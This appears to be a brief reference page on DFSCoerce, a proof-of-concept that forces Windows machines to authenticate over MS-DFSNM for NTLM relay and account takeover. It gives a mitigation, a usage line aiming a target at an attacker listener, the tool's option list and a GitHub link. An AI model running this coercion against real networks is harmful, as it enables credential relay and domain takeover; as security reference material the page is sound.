# DFSCoerce

MS-DFSNM abuse (DFSCoerce)
A New NTLMv2 Relay Attack for Complete Account Takeover.

## Date

2022-06-22 POC on github.

## Synopsis

PoC for MS-DFSNM coerce authentication using `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` (found by @xct_de) methods.

## Mitigation

Disable the deprecated NTLM authentication where possible and use the Extended Protection for Authentication (EPA).

## Example

```bash
$ python3 dfscoerce.py -u mane -d domain.local LHOST RHOST
```

## Tools Options

```bash
$ python3 dfscoerce.py -h
usage: dfscoerce.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH]
                    [-no-pass] [-k] [-dc-ip ip address] [-target-ip ip address]
                    listener target

DFSCoerce - PoC to coerce machine account authentication via MS-DFSNM NetrDfsRemoveStdRoot()

positional arguments:
  listener              ip address or hostname of listener
  target                ip address or hostname of target

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        valid username
  -p PASSWORD, --password PASSWORD
                        valid password (if omitted, it will be asked unless -no-pass)
  -d DOMAIN, --domain DOMAIN
                        valid domain name
  -hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file
                        (KRB5CCNAME) based on target parameters. If valid credentials cannot be
                        found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part
                        (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was
                        specified as target. This is useful when target is the NetBIOS name or
                        Kerberos name and you cannot resolve it
```

## Related Links

[GitHub - Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)
